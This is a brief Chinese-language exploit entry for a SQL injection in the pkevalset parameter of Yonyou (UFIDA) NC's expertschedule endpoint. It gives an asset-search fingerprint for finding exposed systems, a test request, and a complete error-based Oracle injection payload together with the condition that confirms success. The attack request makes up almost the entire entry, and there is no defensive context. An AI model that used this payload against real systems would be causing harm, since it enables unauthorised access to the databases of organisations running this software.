# 用友NCpkevalset存在Sql注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`product="用友-UFIDA-NC"`
- **请求**：`GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1' HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
上述判断条件为响应中存在查询错误：sql且状态200，部分可用payload
GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1%27)%20AND%206913=(SELECT%20UPPER(XMLType(CHR(60)CHR(58)CHR(113)CHR(120)CHR(122)CHR(120)CHR(113)(SELECT%20(CASE%20WHEN%20(6913=6913)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)CHR(113)CHR(120)CHR(122)CHR(120)CHR(113)CHR(62)))%20FROM%20DUAL)%20AND%20(%27REtI%27=%27REtI HTTP/1.1
Host:
```
- **预期**：200　|　—